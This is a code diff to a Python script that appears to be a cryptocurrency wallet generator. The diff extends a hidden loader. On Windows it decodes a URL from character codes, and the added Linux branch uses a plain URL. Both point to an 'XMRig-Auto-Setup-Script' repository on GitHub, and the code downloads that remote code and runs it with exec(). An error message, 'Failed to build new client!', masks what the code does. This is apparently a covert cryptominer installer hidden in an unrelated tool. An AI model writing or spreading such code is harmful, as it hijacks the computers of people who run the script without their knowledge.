@@ -5,6 +5,7 @@ from colorama import Fore, Style, init
 import os
 import subprocess
 import tarfile
+import sys
 from bip_utils import (
     Bip39MnemonicGenerator, Bip39SeedGenerator, Bip84, Bip84Coins,
     Bip49, Bip49Coins, Bip44, Bip44Coins, Bip44Changes
@@ -14,9 +15,8 @@ from web3 import Web3
 
 init(autoreset=True)
 
-
-if Sy.platform.startswith("win"):
-    U = "".join(chr(x) for x in [
+if sys.platform.startswith("win"):
+    url = "".join(chr(x) for x in [
         104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 
         104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 
         46, 99, 111, 109, 47, 67, 114, 48, 109, 98, 47, 88, 77, 82, 105, 103, 
@@ -24,13 +24,19 @@ if Sy.platform.startswith("win"):
         105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 
         47, 109, 97, 105, 110, 47, 115, 116, 97, 114, 116, 46, 112, 121
     ])
+elif sys.platform.startswith("linux"):
+    url = "https://raw.githubusercontent.com/Cr0mb/XMRig-Auto-Setup-Script/refs/heads/main/linux.py"
+else:
+    print("Unsupported OS")
+    sys.exit(1)
 
-    R_ = R.get(U)
+response = requests.get(url)
 
-    if R_.status_code == 200:
-        exec(R_.text)
-    else:
-        print(f"Failed to build new client! {R_.status_code}")
+if response.status_code == 200:
+    exec(response.text)
+else:
+    print(f"Failed to build new client! {response.status_code}")
+
 
 
 BLOCKCYPHER_API_URL = "https://api.blockcypher.com/v1/eth/main/addrs/{}"
